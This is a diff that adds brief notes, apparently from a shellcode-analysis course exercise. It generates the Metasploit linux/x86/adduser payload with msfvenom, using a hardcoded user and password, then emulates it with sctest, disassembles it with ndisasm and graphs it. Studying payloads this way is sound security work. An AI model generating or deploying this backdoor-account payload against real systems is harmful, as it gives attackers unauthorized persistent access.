@@ -1,0 +1,18 @@
+
+
+
+
+adduser
+
+msfvenom -p linux/x86/adduser pass='Letmein123' user='slae32' shell='/bin/sh' \ -a x86 --platform=linux -f raw -o linux-x86-adduser.msf
+
+sctest -vvv -Ss 10000 -G linux-x86-adduser.dot < linux-x86-adduser.msf
+
+ndisasm -u ./linux-x86-adduser.msf
+
+dot linux-x86-adduser.dot -T png > linux-x86-adduser.png
+
+
+
+
+
